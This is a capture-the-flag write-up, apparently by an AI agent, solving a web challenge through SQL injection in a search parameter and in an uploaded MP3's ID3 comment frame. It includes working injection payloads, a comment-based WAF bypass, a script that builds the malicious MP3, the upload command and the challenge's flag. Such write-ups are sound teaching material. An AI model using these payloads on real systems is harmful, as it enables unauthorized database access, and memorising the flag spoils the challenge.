# Citadel Archives Writeup

## Challenge

- Name: Citadel Archives
- Type: Web
- Flag: `Kaal{5ql_1nj3c710n_1n_w3573r05}`

## Summary

The application accepts MP3 uploads and parses ID3 metadata. There are two SQL injection points:

1. `GET /api/tracks?q=...`
2. The MP3 `COMM` comment frame processed by `/upload`

The search endpoint leads to a fake flag. The intended path is the SQL injection in the uploaded MP3 comment.

## Recon

The main page exposed:

- `/upload`
- `/api/tracks`
- `/tracks`

The upload page suggested the server reads metadata hidden inside MP3 files:

> The server doesn't ask questions. It just listens to every tag, every field, every instruction buried inside an MP3.

Uploading a normal MP3 showed an internal section called `Maester's Ledger` with four columns:

- `Entry`
- `House`
- `Vault`
- `Margin Note`

This made it clear that uploaded metadata was being inserted into or queried from a backend database.

## First SQLi: search endpoint

The search endpoint was injectable:

```text
/api/tracks?q=%' OR 1=1--
```

That returned all rows. Using boolean extraction on SQLite metadata exposed tables such as:

- `tracks`
- `users`
- `system_metadata_logs`
- `fake_flags`
- `archive_shadow_index`

Dumping `archive_shadow_index.value` yielded:

```text
Kaal{CongrAts_y0u_g0t_SQL1_but_It_1s_F4Ke}
```

That was a decoy.

## Real bug: MP3 comment frame

Using `ffmpeg -metadata comment=...` was not enough because it produced a `TXXX` frame, not a true ID3 `COMM` frame. The server only treated a real `COMM` frame as the internal note.

I created a tiny valid MP3:

```bash
ffmpeg -y -f lavfi -i anullsrc=r=44100:cl=mono -t 0.2 -q:a 9 baseline.mp3
```

Then I used `mutagen` to create a proper `COMM` frame:

```bash
python3 -m venv .venv
.venv/bin/pip install mutagen
```

Test file:

```bash
.venv/bin/python - <<'PY'
from mutagen.id3 import ID3, TIT2, TPE1, TALB, COMM
from shutil import copyfile

copyfile('baseline.mp3', 'comm_frame.mp3')
tags = ID3()
tags.add(TIT2(encoding=3, text='codex_comm_frame'))
tags.add(TPE1(encoding=3, text='codex_agent'))
tags.add(TALB(encoding=3, text='comm_album'))
tags.add(COMM(encoding=3, lang='eng', desc='', text='hello_comm_frame'))
tags.save('comm_frame.mp3', v2_version=4)
PY
```

Uploading that file made `hello_comm_frame` appear in `Margin Note`, confirming the correct field.

## Proving SQL injection in `COMM`

The following `COMM` payload made the internal ledger dump all records:

```text
x' OR 1=1--
```

That confirmed the comment field was used unsafely in a SQL query.

## WAF bypass

A direct `UNION SELECT` was blocked and returned `BLOCKED_BY_WAF`.

However, SQLite accepted comments between tokens, so this bypass worked:

```sql
x'UNION/**/SELECT * FROM system_metadata_logs--
```

This was short enough to fit in the parsed comment and bypassed the filter on `UNION SELECT`.

## Final exploit

Generate the solving MP3:

```bash
.venv/bin/python - <<'PY'
from mutagen.id3 import ID3, TIT2, TPE1, TALB, COMM
from shutil import copyfile

payload = "x'UNION/**/SELECT * FROM system_metadata_logs--"

copyfile('baseline.mp3', 'solve.mp3')
tags = ID3()
tags.add(TIT2(encoding=3, text='solve'))
tags.add(TPE1(encoding=3, text='codex'))
tags.add(TALB(encoding=3, text='union'))
tags.add(COMM(encoding=3, lang='eng', desc='', text=payload))
tags.save('solve.mp3', v2_version=4)
PY
```

Upload it:

```bash
curl -sS -F file=@solve.mp3 http://chall-cb13242a.evt-316.labs.ctf7.com/upload
```

The internal ledger then rendered:

```html
<td>1</td>
<td>FLAG</td>
<td>Kaal{5ql_1nj3c710n_1n_w3573r05}</td>
<td>2024-01-01</td>
```

## Conclusion

The intended solve path was SQL injection through the MP3 `COMM` frame processed by `/upload`. The search endpoint SQLi was real but only led to a fake flag. The real flag was stored in `system_metadata_logs` and could be revealed by a WAF-bypassing `UNION/**/SELECT` payload embedded in the MP3 comment.

## Flag

```text
Kaal{5ql_1nj3c710n_1n_w3573r05}
```
